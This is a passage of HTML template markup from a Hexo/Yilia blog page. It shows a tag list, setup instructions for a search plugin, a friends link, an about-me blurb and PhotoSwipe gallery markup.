                <a href="javascript:void(0)" class="js-tag color4">ret2dlresolve</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">life</a>
              </li>
             
              <li class="article-tag-list-item">
                <a href="javascript:void(0)" class="js-tag color5">算法概述</a>
              </li>
            
            <div class="clearfix"></div>
          </ul>
        </div>
        <ul class="search-ul">
          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
            2、在根目录_config.yml里添加配置：
<pre style="font-size: 12px;" q-show="jsonFail">
  jsonContent:
    meta: false
    pages: false
    posts:
      title: true
      date: true
      path: true
      text: true
      raw: false
      content: false
      slug: false
      updated: false
      comments: false
      link: false
      permalink: false
      excerpt: false
      categories: false
      tags: true
</pre>
          </p>
          <li class="search-li" q-repeat="items" q-show="isShow">
            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
            <p class="search-time">
              <i class="icon-calendar icon"></i>
              <span q-text="date|dateformat"></span>
            </p>
            <p class="search-tag">
              <i class="icon-price-tags icon"></i>
              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
            </p>
          </li>
        </ul>
    	</section>
    

    
    	<section class="tools-section tools-section-friends" q-show="friends">
  		
        <ul class="search-ul">
          
            <li class="search-li">
              <a href="http://www.reehy.cn/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>Ree的墓碑</a>
            </li>
          
        </ul>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me" q-show="aboutme">
  	  	
  	  		<div class="aboutme-wrap" id="js-aboutme">Send you a bullet.&lt;br&gt;&lt;br&gt;Face fear of life bravely.</div>
  	  	
    	</section>
    
  </div>
  
</div>
    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>